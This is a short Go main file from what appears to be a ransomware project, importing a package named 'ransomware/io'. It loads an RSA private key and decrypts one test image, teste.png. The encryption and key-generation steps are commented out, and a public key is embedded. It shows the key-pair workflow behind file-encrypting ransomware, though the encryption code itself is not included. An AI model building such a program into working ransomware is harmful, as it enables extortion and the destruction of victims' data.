package main

import (
	"fmt"
	"os"
	io "ransomware/io"
	"sync"
)

var waitGroup sync.WaitGroup

func main() {

	var err error
	// privateKey, _ := rsa.GenerateKey(rand.Reader, 2048)
	// publicKey := &privateKey.PublicKey
	// io.StorePrivateKey(privateKey)
	// io.StorePublicKey(publicKey)

	// publicKey := io.ReadPublicKey("publicKey.pem")
	privateKey := io.ReadPrivateKey("privateKey.pem")

	// publicKey := io.DecodePublicKey(pubKeyPem)

	fInfo, _ := os.Lstat("teste.png")

	teste := io.File{Info: fInfo, Path: "teste.png", Extension: "png"}
	// err = teste.Encrypt(publicKey)
	err = teste.Decrypt(privateKey)
	if err != nil {
		fmt.Println(err)
	}

}

var (
	pubKeyPem = []byte(`-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEArZFHr8S/XO5Lzr/3oVtWCF07UEpFEf5v3B/QhftkZG/vyKl1k5Qo
AmODlQ0WL3cE5xbL4apJooNP1Cmho7SbmZ2z9yOZWDlkI5mF11Dn7RsvRATVdWOc
jXqRx5/CfPfUcN7eMYdUpQ/q7XWgnT2gaFuFFNlnI+0HpEZw/Ncbu/0DJQ1SIbuH
InxveKJPQZEZkAlFESbAzwayYO8a1SkcctlCljV/cCoRmYbO1rxlOyIoZPQ3GPNF
gx2OnSXMC0aDiDYcT+tifBURuQUTw/qe3wqVfvzrGNvHU+c/Z85hUMwhSB8lpfRo
tr1zd788DLQbesmVBKCANqdanyLnsUtVjQIDAQAB
-----END RSA PUBLIC KEY-----
`)
)
